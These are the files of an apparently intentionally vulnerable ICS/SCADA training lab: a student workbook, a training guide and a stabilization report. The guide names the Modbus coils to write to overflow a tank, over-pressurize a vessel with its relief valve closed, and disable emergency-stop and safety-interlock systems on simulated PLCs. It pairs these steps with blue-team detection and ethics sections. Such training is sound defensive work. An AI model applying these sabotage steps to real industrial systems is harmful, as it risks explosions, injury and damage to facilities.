| PLC-2    |      |                          |               |
| PLC-3    |      |                          |               |
| PLC-4    |      |                          |               |

### Step 3: Detection Analysis

**How many PLCs were discovered?** ___________

**What information did you gather about each PLC?**

&nbsp;

&nbsp;

**What blue team detection indicators were mentioned?**

1. ________________________________________________________________

2. ________________________________________________________________

3. ________________________________________________________________

## Post-Exercise Questions

### 1. Why is reconnaissance often the first phase of an ICS attack?

**Your Answer:**

&nbsp;

&nbsp;

### 2. What could a defender do to make reconnaissance more difficult?

**Your Answer:**

&nbsp;

&nbsp;

### 3. Is this reconnaissance activity noisy or stealthy? Explain.

**Your Answer:**

&nbsp;

&nbsp;

## Instructor Sign-Off

**Completed:** [ ] Yes [ ] No
**Instructor Signature:** ________________________________

---

# Lab Exercise 2: Tank Overflow Attack (PLC-1)

**Difficulty:** Intermediate
**Estimated Time:** 30 minutes
**MITRE ATT&CK:** T0836 - Modify Parameter

## Learning Objectives

By the end of this lab, you will be able to:
- [ ] Understand process control manipulation techniques
- [ ] Execute a write coil attack against a PLC
- [ ] Predict physical impacts of process attacks

## Pre-Exercise Questions

### 1. What is a Modbus coil and what does it control?

**Your Answer:**

&nbsp;

&nbsp;

### 2. In a tank control system, what could cause an overflow?

**Your Answer:**

&nbsp;

&nbsp;

### 3. What real-world facility might use a tank control system like PLC-1?

**Your Answer:**

&nbsp;

&nbsp;

## Lab Instructions

### Step 1: Review the Attack Scenario

Read the attack methodology:
1. Turn ON pump (coil 0) â†’ Fill tank
2. Close outlet valve (coil 3) â†’ Prevent drainage
3. Result: Tank level rises uncontrollably

**Predict the outcome before executing:**

&nbsp;

&nbsp;

### Step 2: Execute the Attack

Run the training scenarios script and select **[2] Tank Overflow Attack (PLC-1)**

**Document each step:**

| Step | Action | Coil # | Value | Success? | Observation |
|------|--------|--------|-------|----------|-------------|
| 1    |        |        |       |          |             |
| 2    |        |        |       |          |             |

### Step 3: Analyze the Impact

**Expected Impact (from scenario):**

- [ ] Tank level rises uncontrollably
- [ ] High-level alarms triggered
- [ ] Potential physical damage to tank
- [ ] Production downtime

**What blue team indicators were shown?**

1. ________________________________________________________________

2. ________________________________________________________________

3. ________________________________________________________________

## Post-Exercise Questions

### 1. How does this attack compare to real-world water treatment facility attacks?

**Your Answer:**

&nbsp;

&nbsp;

### 2. What safety mechanisms should be in place to prevent this attack?

**Your Answer:**

&nbsp;

&nbsp;

### 3. As a defender, how would you detect this attack in progress?

**Your Answer:**

&nbsp;

&nbsp;

### 4. What Modbus function codes were used in this attack?

**Your Answer:**

&nbsp;

&nbsp;

## Instructor Sign-Off

**Completed:** [ ] Yes [ ] No
**Instructor Signature:** ________________________________

---

# Lab Exercise 3: Pressure Vessel Rupture (PLC-2)

**Difficulty:** Advanced
**Estimated Time:** 30 minutes
**MITRE ATT&CK:** T0816 - Device Restart/Shutdown

## Learning Objectives

By the end of this lab, you will be able to:
- [ ] Understand safety system bypass techniques
- [ ] Recognize the severity of pressure-related attacks
- [ ] Analyze similarities to real-world attacks like Triton/TRISIS

## Pre-Exercise Questions

### 1. What is Triton/TRISIS and what systems did it target?

**Your Answer:**

&nbsp;

&nbsp;

### 2. Why are pressure relief valves critical safety devices?

**Your Answer:**

&nbsp;

&nbsp;

### 3. What physical consequences could result from over-pressurization?

**Your Answer:**

&nbsp;

&nbsp;

## Lab Instructions

### Step 1: Review Safety Implications

This scenario demonstrates a **CRITICAL** safety system attack.

**Before executing, explain why this is more dangerous than the tank overflow:**

&nbsp;

&nbsp;

### Step 2: Execute the Attack

Run the training scenarios script and select **[3] Pressure Vessel Rupture (PLC-2)**

**Document the attack steps:**

| Step | Device | Coil # | Action | Expected Result |
|------|--------|--------|--------|-----------------|
| 1    |        |        |        |                 |
| 2    |        |        |        |                 |

### Step 3: Impact Analysis

**Expected Impact:**

- [ ] Pressure exceeds safe limits
- [ ] Risk of vessel rupture/explosion
- [ ] Safety systems bypassed
- [ ] Potential for casualties

**Blue Team Detection Indicators:**

1. ________________________________________________________________

2. ________________________________________________________________

3. ________________________________________________________________

## Post-Exercise Questions

### 1. How does this attack methodology compare to Triton/TRISIS?

**Your Answer:**

&nbsp;

&nbsp;

### 2. What immediate actions should a blue team take if this is detected?

**Your Answer:**

&nbsp;

&nbsp;

### 3. Why are safety system attacks classified as the highest severity?

**Your Answer:**

&nbsp;

&nbsp;

### 4. What layers of defense should protect against this type of attack?

**Your Answer:**

&nbsp;

&nbsp;

## Instructor Sign-Off

**Completed:** [ ] Yes [ ] No
**Instructor Signature:** ________________________________

---

# Lab Exercise 4: Thermal Stress Attack (PLC-3)

**Difficulty:** Intermediate
**Estimated Time:** 30 minutes
**MITRE ATT&CK:** T0879 - Damage to Property

## Learning Objectives

By the end of this lab, you will be able to:
- [ ] Understand equipment degradation techniques
- [ ] Recognize Stuxnet-style attack patterns
- [ ] Analyze long-term vs. immediate attack impacts

## Pre-Exercise Questions

### 1. How did Stuxnet cause physical damage to centrifuges?

**Your Answer:**

&nbsp;

&nbsp;

### 2. What is thermal stress and how does it damage equipment?

**Your Answer:**

&nbsp;

&nbsp;

### 3. Why might an attacker prefer gradual degradation over immediate destruction?

**Your Answer:**

&nbsp;

&nbsp;

## Lab Instructions

### Step 1: Understand the Attack Pattern

This attack uses rapid heating and cooling cycles to stress equipment.

**Predict the mechanism of damage:**

&nbsp;

&nbsp;

### Step 2: Execute the Attack

Run the training scenarios script and select **[4] Thermal Stress Attack (PLC-3)**

**Document the thermal cycles:**

| Cycle | Heater (Coil 0) | Cooler (Coil 2) | Duration | Observation |
|-------|-----------------|-----------------|----------|-------------|
| 1     |                 |                 |          |             |
| 2     |                 |                 |          |             |
| 3     |                 |                 |          |             |

### Step 3: Analyze the Pattern

**Expected Impact:**

- [ ] Thermal shock to equipment
- [ ] Accelerated wear and tear
- [ ] Reduced equipment lifespan
- [ ] Maintenance costs increase

**Blue Team Detection Indicators:**

1. ________________________________________________________________

2. ________________________________________________________________

3. ________________________________________________________________

## Post-Exercise Questions

### 1. How is this attack more covert than the previous scenarios?

**Your Answer:**

&nbsp;

&nbsp;

### 2. What process monitoring would detect abnormal thermal cycling?

**Your Answer:**

&nbsp;

&nbsp;

### 3. Compare this to Stuxnet's approach - what are the similarities?

**Your Answer:**

&nbsp;

&nbsp;

### 4. What is the advantage of this attack from an attacker's perspective?

**Your Answer:**

&nbsp;

&nbsp;

## Instructor Sign-Off

**Completed:** [ ] Yes [ ] No
**Instructor Signature:** ________________________________

---

# Lab Exercise 5: Safety System Shutdown (PLC-4)

**Difficulty:** Expert
**Estimated Time:** 30 minutes
**MITRE ATT&CK:** T0816 - Device Restart/Shutdown

## Learning Objectives

By the end of this lab, you will be able to:
- [ ] Understand emergency shutdown system attacks
- [ ] Recognize maximum priority security incidents
- [ ] Analyze coordinated attack campaigns

## Pre-Exercise Questions

### 1. What is an Emergency Stop (E-Stop) system?

**Your Answer:**

&nbsp;

&nbsp;

### 2. Why would an attacker disable safety systems before other attacks?

**Your Answer:**

&nbsp;

&nbsp;

### 3. What incident response procedures should follow safety system tampering?

**Your Answer:**

&nbsp;

&nbsp;

## Lab Instructions

### Step 1: Review the Severity

This scenario requires typing **'CONFIRM'** to execute.

**Explain why this confirmation is required:**

&nbsp;

&nbsp;

### Step 2: Execute the Attack

Run the training scenarios script and select **[5] Safety System Shutdown (PLC-4)**

**Document the safety system disable:**

| System Component | Coil # | Action | Result | Severity |
|------------------|--------|--------|--------|----------|
| Emergency Stop   |        |        |        |          |
| Safety Interlock |        |        |        |          |

### Step 3: Incident Response Planning

**Expected Impact:**

- [ ] No emergency stop capability
- [ ] Safety interlocks bypassed
- [ ] Plant cannot be safely shut down
- [ ] Other attacks now more dangerous

**Blue Team Response Actions:**

1. ________________________________________________________________

2. ________________________________________________________________

3. ________________________________________________________________

4. ________________________________________________________________

## Post-Exercise Questions

### 1. Why is this considered the most dangerous attack scenario?

**Your Answer:**

&nbsp;

&nbsp;

### 2. What should the blue team priority level be for this alert?

**Your Answer:**

&nbsp;

&nbsp;

### 3. What regulatory notifications might be required after this incident?

**Your Answer:**

&nbsp;

&nbsp;

### 4. How does disabling PLC-4 enable more dangerous attacks on other PLCs?

**Your Answer:**

&nbsp;

&nbsp;

## Instructor Sign-Off

**Completed:** [ ] Yes [ ] No
**Instructor Signature:** ________________________________

---

# Lab Exercise 6: Multi-Stage APT Campaign

**Difficulty:** Expert
**Estimated Time:** 45 minutes
**MITRE ATT&CK:** Multiple Techniques

## Learning Objectives

By the end of this lab, you will be able to:
- [ ] Understand coordinated multi-stage attacks
- [ ] Recognize APT methodologies
- [ ] Analyze cascading system failures

## Pre-Exercise Questions

### 1. What is an Advanced Persistent Threat (APT)?

**Your Answer:**

&nbsp;

&nbsp;

### 2. Why do APTs use multi-stage attacks instead of single attacks?

**Your Answer:**

&nbsp;

&nbsp;

### 3. Name a real-world nation-state ICS attack campaign:

**Your Answer:**

&nbsp;

&nbsp;

## Lab Instructions

### Step 1: Review the Attack Timeline

Document the planned attack phases:

| Phase | Target | Objective | Expected Impact |
|-------|--------|-----------|-----------------|
| 1     |        |           |                 |
| 2     |        |           |                 |
| 3     |        |           |                 |
| 4     |        |           |                 |

### Step 2: Execute the APT Campaign

Run the training scenarios script and select **[6] Multi-Stage APT Campaign**

Type **'EXECUTE APT'** to confirm.

**Document each phase execution:**

**Phase 1 (PLC-4):**
- Actions taken: ________________________________________________________
- Result: _______________________________________________________________

**Phase 2 (PLC-1):**
- Actions taken: ________________________________________________________
- Result: _______________________________________________________________

**Phase 3 (PLC-2):**
- Actions taken: ________________________________________________________
- Result: _______________________________________________________________

**Phase 4 (PLC-3):**
- Actions taken: ________________________________________________________
- Result: _______________________________________________________________

### Step 3: Analyze the Cascading Failure

**Expected Impact:**

- [ ] Complete loss of safety systems
- [ ] Multiple simultaneous process failures
- [ ] Cascading equipment damage
- [ ] Potential for catastrophic incident
- [ ] Extended recovery time (days/weeks)

**Blue Team Response Requirements:**

1. ________________________________________________________________

2. ________________________________________________________________

3. ________________________________________________________________

4. ________________________________________________________________

5. ________________________________________________________________

## Post-Exercise Questions

### 1. Why was PLC-4 targeted first in the attack sequence?

**Your Answer:**

&nbsp;

&nbsp;

### 2. How does this attack demonstrate the concept of cascading failures?

**Your Answer:**

&nbsp;

&nbsp;

### 3. What is the estimated recovery time from this type of attack? Why?

**Your Answer:**

&nbsp;

&nbsp;

### 4. What defense-in-depth strategies could prevent or mitigate this APT?

**Your Answer:**

&nbsp;

&nbsp;

### 5. Map each phase to a MITRE ATT&CK for ICS technique:

- Phase 1: ___________________________________________________________
- Phase 2: ___________________________________________________________
- Phase 3: ___________________________________________________________
- Phase 4: ___________________________________________________________

## Instructor Sign-Off

**Completed:** [ ] Yes [ ] No
**Instructor Signature:** ________________________________

---

# Lab Exercise 7: Stealthy Reconnaissance

**Difficulty:** Intermediate
**Estimated Time:** 25 minutes
**MITRE ATT&CK:** T0888 - Remote System Information Discovery

## Learning Objectives

By the end of this lab, you will be able to:
- [ ] Understand evasion techniques for reconnaissance
- [ ] Recognize the difference between noisy and stealthy scans
- [ ] Analyze behavioral detection methods

## Pre-Exercise Questions

### 1. What is the difference between active and passive reconnaissance?

**Your Answer:**

&nbsp;

&nbsp;

### 2. How can reconnaissance activity avoid rate-based detection?

**Your Answer:**

&nbsp;

&nbsp;

### 3. What is "living off the land" in the context of ICS attacks?

**Your Answer:**

&nbsp;

&nbsp;

## Lab Instructions

### Step 1: Compare to Lab Exercise 1

**How does stealthy reconnaissance differ from normal reconnaissance?**

&nbsp;

&nbsp;

### Step 2: Execute the Stealthy Scan

Run the training scenarios script and select **[7] Stealthy Reconnaissance**

**Document the timing behavior:**

| PLC Name | Probe Time | Wait Duration | Active? | Notes |
|----------|------------|---------------|---------|-------|
| PLC-1    |            |               |         |       |
| PLC-2    |            |               |         |       |
| PLC-3    |            |               |         |       |
| PLC-4    |            |               |         |       |

### Step 3: Analyze the Stealth Techniques

**Stealth techniques observed:**

- [ ] Slow scanning (avoid rate-based detection)
- [ ] Read-only operations (no process changes)
- [ ] Randomized timing (avoid pattern detection)
- [ ] Legitimate-looking requests

**Detection difficulty level:** ___________

**Why is detection more difficult?**

&nbsp;

&nbsp;

## Post-Exercise Questions

### 1. Compare Lab 1 and Lab 7 reconnaissance approaches - which is stealthier?

**Your Answer:**

&nbsp;

&nbsp;

### 2. What blue team capabilities are needed to detect stealthy reconnaissance?

**Your Answer:**

&nbsp;

&nbsp;

### 3. What is the trade-off for attackers using stealthy techniques?

**Your Answer:**

&nbsp;

&nbsp;

### 4. How could behavioral analysis detect this activity over time?

**Your Answer:**

&nbsp;

&nbsp;

## Instructor Sign-Off

**Completed:** [ ] Yes [ ] No
**Instructor Signature:** ________________________________

---

# Post-Lab Assessment

After completing all lab exercises, answer the following comprehensive questions:

## 1. MITRE ATT&CK Mapping

Map the techniques you practiced to the MITRE ATT&CK for ICS framework:

| Lab Exercise | MITRE Technique ID | Technique Name |
|--------------|-------------------|----------------|
| Lab 1        |                   |                |
| Lab 2        |                   |                |
| Lab 3        |                   |                |
| Lab 4        |                   |                |
| Lab 5        |                   |                |
| Lab 6        |                   |                |
| Lab 7        |                   |                |

## 2. Attack Severity Ranking

Rank the scenarios from least to most dangerous (1 = least, 7 = most):

| Rank | Scenario | Justification |
|------|----------|---------------|
|      |          |               |
|      |          |               |
|      |          |               |
|      |          |               |
|      |          |               |
|      |          |               |
|      |          |               |

## 3. Defense-in-Depth Strategy

For each layer of defense, list specific controls to protect against these attacks:

**Network Security:**

&nbsp;

&nbsp;

**Application Security:**

&nbsp;

&nbsp;

**Endpoint Security:**

&nbsp;

&nbsp;

**Data Security:**

&nbsp;

&nbsp;

**Physical Security:**

&nbsp;

&nbsp;

## 4. Incident Response Planning

Design an incident response procedure for detecting safety system tampering (PLC-4):

**Detection:**

&nbsp;

&nbsp;

**Analysis:**

&nbsp;

&nbsp;

**Containment:**

&nbsp;

&nbsp;

**Eradication:**

&nbsp;

&nbsp;

**Recovery:**

&nbsp;

&nbsp;

**Lessons Learned:**

&nbsp;

&nbsp;

## 5. Real-World Application

Choose one real-world ICS/SCADA incident and compare it to these lab scenarios:

**Incident Name:** ________________________________________________________

**Year:** _________ **Target Industry:** _________________________________

**Attack Techniques Used:**

&nbsp;

&nbsp;

**Similarities to Lab Exercises:**

&nbsp;

&nbsp;

**Differences from Lab Exercises:**

&nbsp;

&nbsp;

**Lessons Learned:**

&nbsp;

&nbsp;

## 6. Blue Team Perspective

You are a SOC analyst monitoring this ICS environment.

**What alerts would you prioritize investigating first?**

1. ________________________________________________________________

2. ________________________________________________________________

3. ________________________________________________________________

**What log sources would you correlate?**

&nbsp;

&nbsp;

**What indicators of compromise (IOCs) would you look for?**

&nbsp;

&nbsp;

## 7. Ethical Considerations

**Why is it critical to only perform these attacks in authorized lab environments?**

&nbsp;

&nbsp;

**What are the legal consequences of unauthorized ICS/SCADA attacks?**

&nbsp;

&nbsp;

**How can you use this knowledge to improve ICS security defensively?**

&nbsp;

&nbsp;

---

# Skills Checklist

After completing this workbook, I can:

**Red Team Skills:**
- [ ] Identify and enumerate Modbus TCP devices
- [ ] Execute Modbus write coil attacks
- [ ] Execute Modbus write register attacks
- [ ] Manipulate process control systems
- [ ] Bypass safety mechanisms
- [ ] Execute multi-stage attack campaigns
- [ ] Perform stealthy reconnaissance

**Blue Team Skills:**
- [ ] Recognize ICS reconnaissance patterns
- [ ] Detect process manipulation attacks
- [ ] Identify safety system tampering
- [ ] Prioritize security incidents by severity
- [ ] Map attacks to MITRE ATT&CK for ICS
- [ ] Design incident response procedures
- [ ] Implement defense-in-depth for ICS

**General ICS Security:**
- [ ] Understand Modbus protocol fundamentals
- [ ] Recognize real-world attack parallels
- [ ] Analyze cascading failure scenarios
- [ ] Evaluate physical safety implications
- [ ] Apply ethical hacking principles

---

# Final Reflection

## What was the most important thing you learned from these exercises?

&nbsp;

&nbsp;

&nbsp;

## What surprised you most about ICS/SCADA security?

&nbsp;

&nbsp;

&nbsp;

## How will you apply this knowledge in your career?

&nbsp;

&nbsp;

&nbsp;

## What additional ICS security topics would you like to explore?

&nbsp;

&nbsp;

&nbsp;

---

# Certificate of Completion

This certifies that **_______________________________** has successfully completed the ICS/SCADA Security Training Workbook and demonstrated proficiency in industrial control system security concepts.

**Completed:** _____ / _____ lab exercises

**Instructor Name:** ________________________________

**Instructor Signature:** ________________________________

**Date:** ________________________________

**Institution/Organization:** ________________________________

---

## Additional Resources

- MITRE ATT&CK for ICS: https://attack.mitre.org/matrices/ics/
- CISA ICS Security Resources: https://www.cisa.gov/topics/industrial-control-systems
- SANS ICS Security Resources: https://www.sans.org/industrial-control-systems-security/
- Project Repository: [Link to your Vuln-PLC repository]

---

**Version:** 1.0
**Created:** 2025-12-28
**Project:** Vuln-PLC ICS/SCADA Training Environment



================================================================================
FILE: TRAINING_GUIDE.md
================================================================================
# ICS/SCADA Attack Training Guide

## Overview

This guide provides realistic attack scenarios for training security professionals in industrial control system (ICS) and SCADA security. All scenarios are designed for educational purposes only and should only be executed in controlled lab environments.

## Training Scenarios

### Scenario 1: Reconnaissance - System Discovery
**Difficulty:** Beginner
**Target:** All PLCs
**MITRE ATT&CK:** T0840 - Network Connection Enumeration

**Learning Objectives:**
- Understand ICS network discovery techniques
- Learn Modbus port scanning methodology
- Practice PLC fingerprinting

**Skills Developed:**
- Network enumeration
- Service identification
- Target profiling

---

### Scenario 2: Tank Overflow Attack (PLC-1)
**Difficulty:** Intermediate
**Target:** PLC-1 (Tank Control System)
**MITRE ATT&CK:** T0836 - Modify Parameter

**Real-World Parallel:** Water treatment facility attacks

**Attack Methodology:**
1. Turn ON pump (coil 0) to fill tank
2. Close outlet valve (coil 3) to prevent drainage
3. Result: Uncontrolled tank level rise

**Expected Impact:**
- Tank overflow
- High-level alarms triggered
- Physical damage to tank
- Production downtime

**Blue Team Detection:**
- Write operations to critical coils
- Abnormal process values
- Safety system alarms

---

### Scenario 3: Pressure Vessel Rupture (PLC-2)
**Difficulty:** Advanced
**Target:** PLC-2 (Pressure Control System)
**MITRE ATT&CK:** T0816 - Device Restart/Shutdown

**Real-World Parallel:** Triton/TRISIS safety system attacks

**Attack Methodology:**
1. Enable compressor (coil 0) to increase pressure
2. Close relief valve (coil 4) to disable safety relief
3. Result: Pressure exceeds safe operating limits

**Expected Impact:**
- CRITICAL: Pressure exceeds safe limits
- Risk of vessel rupture/explosion
- Safety systems bypassed
- Potential for casualties

**Blue Team Detection:**
- CRITICAL alerts for safety tampering
- Relief valve closure during high pressure
- Emergency shutdown procedures triggered

---

### Scenario 4: Thermal Stress Attack (PLC-3)
**Difficulty:** Intermediate
**Target:** PLC-3 (Temperature Control System)
**MITRE ATT&CK:** T0879 - Damage to Property

**Real-World Parallel:** Stuxnet equipment degradation methodology

**Attack Methodology:**
1. Rapid heating/cooling cycles
2. Thermal stress on equipment
3. Result: Accelerated equipment degradation

**Expected Impact:**
- Thermal shock to equipment
- Accelerated wear and tear
- Reduced equipment lifespan
- Increased maintenance costs

**Blue Team Detection:**
- Abnormal temperature fluctuations
- Rapid setpoint changes
- Process deviation alarms

---

### Scenario 5: Safety System Shutdown (PLC-4)
**Difficulty:** Expert
**Target:** PLC-4 (Safety/Emergency Shutdown System)
**MITRE ATT&CK:** T0816 - Device Restart/Shutdown

**Real-World Parallel:** Triton/TRISIS attack methodology

âš ï¸ **WARNING:** This is the most dangerous attack scenario!

**Attack Methodology:**
1. Disable emergency stop (coil 0)
2. Disable safety interlock (coil 1)
3. Result: No safety systems to prevent catastrophe

**Expected Impact:**
- CRITICAL: No emergency stop capability
- CRITICAL: Safety interlocks bypassed
- Plant cannot be safely shut down
- Other attacks become more dangerous

**Blue Team Detection:**
- MAXIMUM PRIORITY ALERT
- Safety system tampering detected
- Immediate incident response required
- Consider emergency plant shutdown

---

### Scenario 6: Multi-Stage APT Campaign
**Difficulty:** Expert
**Target:** All PLCs (System-Wide)
**MITRE ATT&CK:** Multiple Techniques

**Real-World Parallel:** Nation-state APT campaigns

**Attack Timeline:**
- **Phase 1:** Disable safety systems (PLC-4)
- **Phase 2:** Overflow tank (PLC-1)
- **Phase 3:** Over-pressurize (PLC-2)
- **Phase 4:** Thermal damage (PLC-3)
- **Result:** Cascading system failure

**Expected Impact:**
- Complete loss of safety systems
- Multiple simultaneous process failures
- Cascading equipment damage
- Potential for catastrophic incident
- Extended recovery time (days/weeks)

**Blue Team Response:**
- Declare security incident
- Emergency plant shutdown
- Isolate OT network from IT
- Begin forensic investigation
- Notify authorities/regulatory bodies

---

### Scenario 7: Stealthy Reconnaissance
**Difficulty:** Intermediate
**Target:** All PLCs
**MITRE ATT&CK:** T0888 - Remote System Information Discovery

**Learning Objectives:**
- Understand detection evasion techniques
- Learn how attackers avoid triggering alarms
- Practice covert intelligence gathering

**Stealth Techniques:**
- Slow scanning (avoid rate-based detection)
- Read-only operations (no process changes)
- Randomized timing (avoid pattern detection)
- Legitimate-looking requests

**Blue Team Detection:**
- LOW - Stealthy approach reduces detection
- Slow scan may blend with normal traffic
- Long-term behavioral analysis needed

---

## Using the Training Scenarios

### Quick Start

Run the interactive training menu:

```bash
./training_scenarios.py
```

or

```bash
python3 training_scenarios.py
```

### Prerequisites

1. Vuln-PLC environment running (all 4 PLCs active)
2. Python 3.x installed
3. Network access to PLCs:
   - PLC-1: localhost:5502
   - PLC-2: localhost:5503
   - PLC-3: localhost:5504
   - PLC-4: localhost:5505

### Training Recommendations

**For Beginners:**
1. Start with Scenario 1 (Reconnaissance)
2. Progress to Scenario 2 (Tank Overflow)
3. Try Scenario 7 (Stealthy Reconnaissance)

**For Intermediate Users:**
1. Scenarios 2, 4, 7
2. Focus on understanding blue team detection indicators
3. Practice both attack and defense perspectives

**For Advanced Users:**
1. Scenarios 3, 5, 6
2. Understand APT methodologies
3. Learn incident response procedures

**For Expert Red Teams:**
1. Scenario 6 (Multi-Stage APT)
2. Develop custom attack chains
3. Practice covert persistence

---

## MITRE ATT&CK for ICS Mapping

This training covers the following MITRE ATT&CK for ICS techniques:

- **T0816** - Device Restart/Shutdown
- **T0836** - Modify Parameter
- **T0840** - Network Connection Enumeration
- **T0879** - Damage to Property
- **T0888** - Remote System Information Discovery

Reference: https://attack.mitre.org/matrices/ics/

---

## Safety and Ethics

### Training Environment Only

âš ï¸ **CRITICAL:** These scenarios must ONLY be executed in:
- Isolated lab environments
- Virtual/containerized systems
- Educational settings with proper authorization

### Never Execute Against:
- Production ICS/SCADA systems
- Real industrial facilities
- Systems you don't own or have explicit permission to test
- Any system where failure could cause harm

### Legal Considerations

Unauthorized access to ICS/SCADA systems is illegal and can result in:
- Criminal prosecution
- Significant fines
- Imprisonment
- Civil liability

### Ethical Use

This training is designed to:
- Educate security professionals
- Improve industrial cybersecurity
- Demonstrate attack techniques for defensive purposes
- Prepare incident responders

---

## Blue Team Training

Each scenario includes blue team detection indicators. Use these to:

1. **Configure Detection Rules:**
   - Set up IDS/IPS signatures
   - Configure SIEM alerts
   - Implement behavioral analytics

2. **Incident Response Practice:**
   - Recognize attack patterns
   - Execute response playbooks
   - Coordinate with OT teams

3. **Security Hardening:**
   - Implement network segmentation
   - Deploy monitoring tools
   - Strengthen access controls

---

## Additional Resources

### Documentation
- [README.md](README.md) - Project overview
- [MODBUS_IMPLEMENTATION.md](MODBUS_IMPLEMENTATION.md) - Modbus technical details
- [FILTERING_VERIFICATION_REPORT.md](FILTERING_VERIFICATION_REPORT.md) - Alert filtering tests

### Test Scripts
- `test_50_attacks.py` - Comprehensive testing
- `test_all_plcs.py` - Multi-PLC testing
- `test_visual_alerts.py` - Alert system testing

### Attack Demos
- `attack.py` - Basic attack demonstrations
- `demo_attack.py` - Guided attack demos
- `quick_test.py` - Quick functionality tests

---

## Contributing

To add new training scenarios:

1. Follow the existing scenario format
2. Include MITRE ATT&CK mappings
3. Provide clear learning objectives
4. Document expected impacts
5. Include blue team detection indicators

---

## License

See [LICENSE](LICENSE) file for details.

---

## Disclaimer

This software is provided for educational and research purposes only. The authors and contributors are not responsible for any misuse or damage caused by this program. Use at your own risk in authorized environments only.

---

**Generated:** 2025-12-28
**Version:** 1.0
**Project:** Vuln-PLC ICS/SCADA Training Environment



================================================================================
FILE: STABILIZATION_REPORT.md
================================================================================
# Vuln-PLC Stabilization Report
**Date:** 2025-12-28
**Status:** âœ… All Tasks Complete

## Executive Summary
Successfully stabilized the Vuln-PLC system while preserving ALL intentional vulnerabilities. The system now has:
- Reliable Modbus TCP operations (no hangs or resets)
- Consistent state management across all interfaces
- Type-safe process simulations
- Robust database operations
- UUID-based alarm tracking

**CRITICAL:** All exploits remain functional. No security hardening was performed.

---

## Task 1: Modbus TCP Server Stability âœ…

### Changes Made
**File:** `core/app.py` - ModbusTCPServer class

1. **Socket Timeouts** (Line 202)
   - Added 30-second timeout to client sockets
   - Prevents indefinite hangs on malformed requests
   ```python
   client_socket.settimeout(30.0)
   ```

2. **Improved Exception Handling** (Lines 245-267)
   - `socket.timeout` - Graceful timeout handling
   - `ConnectionError` - Expected disconnections
   - `struct.error` - Malformed packet handling
   - Catch-all exception handler prevents server crashes

3. **MBAP Header Validation** (Lines 212-220)
   - Protocol ID check (warns but allows non-zero for education)
   - Length validation (2-260 bytes per Modbus spec)
   - Logs warnings without dropping connections

4. **Enhanced recv_exact()** (Lines 174-192)
   - Explicit timeout handling
   - Clear ConnectionError on socket close
   - Better documentation

### Result
- Modbus CLI commands no longer hang
- Invalid requests logged, not silently dropped
- Server continues serving after client errors

---

## Task 2: Unified Coil/Register Helpers âœ…

### Changes Made
**File:** `core/shared_state.py` (Lines 197-249)

Created four mandatory helper functions:

```python
def get_coil(addr) -> int          # Always returns 0 or 1
def set_coil(addr, value) -> None  # Stores as bool
def get_register(addr) -> int      # Always returns 0-65535
def set_register(addr, value)      # Type-checked
```

### Updated Files
1. **core/app.py** - ModbusTCPServer
   - `read_coils()` - Uses `get_coil()`
   - `read_holding_registers()` - Uses `get_register()`
   - `write_single_coil()` - Uses `set_coil()`
   - `write_single_register()` - Uses `set_register()`
   - `write_multiple_coils()` - Uses `set_coil()`
   - `write_multiple_registers()` - Uses `set_register()`

2. **core/modbus_server.py** - PyModbus server
   - `SyncedDataBlock.setValues()` - Uses helpers
   - `initialize_data_store()` - Uses helpers
   - `sync_state_to_modbus()` - Uses helpers

### Result
- Single source of truth for coil/register access
- Guaranteed type consistency (coils: 0/1, registers: 0-65535)
- HMI, web UI, and Modbus always synchronized

---

## Task 3: Coil Mapping Alignment âœ…

### Changes Made
**File:** `core/app.py` (Lines 468-471)

Updated attack detection to correctly identify critical coils:
```python
if address in [0, 3, 10, 11]:  # Pump, valve, emergency stop, safety interlock
```

### Verified Mapping
- **Coil 0** â†’ `pump1_status` (Pump ON/OFF) âœ…
- **Coil 3** â†’ `valve1_status` (Valve OPEN/CLOSED) âœ…
- **Coil 10** â†’ `emergency_stop` âœ…
- **Coil 11** â†’ `safety_interlock` âœ…

### Result
- IDS alerts correctly identify safety-critical writes
- Documentation matches implementation
- Demo scripts reference correct coil numbers

---

## Task 4: Shared State Hardening âœ…

### Changes Made
**File:** `core/shared_state.py` (Lines 52-103)

Enhanced `init_state()` with:

1. **Missing Key Repair**
   - Adds any missing DEFAULT_STATE keys
   - Logs repair actions

2. **Type Validation & Conversion**
   - Validates all numeric fields are int/float
   - Validates all boolean fields are bool
   - Attempts type conversion before reset

3. **List Validation**
   - Ensures `alarms` is always a list
   - Prevents crashes on malformed state

4. **Atomic Writes** (Already existed, verified)
   - Temp file + rename pattern
   - fsync before rename

5. **File Locking** (Already existed, verified)
   - fcntl shared locks on read
   - Prevents simultaneous write corruption

### Result
- State never becomes corrupted mid-demo
- Type mismatches auto-repaired
- Concurrent access safe

---

## Task 5: Process Simulation Type Safety âœ…

### Changes Made
**File:** `core/app.py` (Lines 920-964)

Added type checks before ALL mutations in `/api/process/status`:

```python
tank1_level = PROCESS_STATE.get('tank1_level', 50.0)
if not isinstance(tank1_level, (int, float)):
    tank1_level = 50.0  # Reset to safe default
PROCESS_STATE['tank1_level'] = max(0, min(100, tank1_level + random.uniform(-2, 2)))
```

Applied to:
- `tank1_level`, `tank1_temp`, `tank1_pressure`
- `tank2_level`, `tank2_temp`
- `flow_rate`, `vibration`, `ph_level`

### Result
- No more crashes from string values in numeric fields
- Auto-recovery from corrupted state
- Simulation remains stable under load

---

## Task 6: Alarm ID Generation âœ…

### Changes Made
**File:** `core/app.py`

1. **Import UUID** (Line 26)
   ```python
   import uuid
   ```

2. **Fixed add_alarm()** (Lines 1199-1223)
   ```python
   alarm = {
       'id': str(uuid.uuid4()),  # Instead of len()+1
       'severity': severity,
       'message': message,
       'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
       'acknowledged': False
   }
   ```

3. **Added Type Safety**
   - Validates `alarms` is a list before append
   - Uses `.get('message')` to prevent KeyError

### Result
- No more alarm ID collisions
- Acknowledge functionality works reliably
- Alarm deletion stable

---

## Task 7: Database Safety âœ…

### Changes Made
**File:** `core/app.py`

1. **init_db()** (Lines 527-561)
   - Added UNIQUE constraint on `users.username`
   - Added UNIQUE constraint on `plc_data.register`
   - Added NOT NULL constraints
   - Used explicit column names in INSERT

2. **plc_write()** (Lines 844-846)
   - Changed from positional VALUES to explicit columns
   - Uses UPSERT via `INSERT OR REPLACE`
   ```python
   c.execute("INSERT OR REPLACE INTO plc_data (register, value, timestamp) VALUES (?, ?, ?)",
             (str(register), value, timestamp))
   ```

### Result
- No silent DB corruption during demos
- Register updates replace old values (proper upsert)
- Primary keys managed by AUTOINCREMENT

---

## Vulnerabilities Preserved (CRITICAL VERIFICATION)

### âœ… All exploits still work:
